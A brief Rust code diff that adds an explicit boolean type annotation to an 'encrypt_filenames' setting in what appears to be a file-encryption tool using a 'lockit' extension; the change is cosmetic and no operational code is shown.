@@ -10,7 +10,7 @@ fn main() {
     let custom_extension: &str = "lockit";
     let custom_directory_extension: &str = "dir";
 
-    let encrypt_filenames = true; 
+    let encrypt_filenames: bool = true; 
 
     let self_destruct_default = false;
 
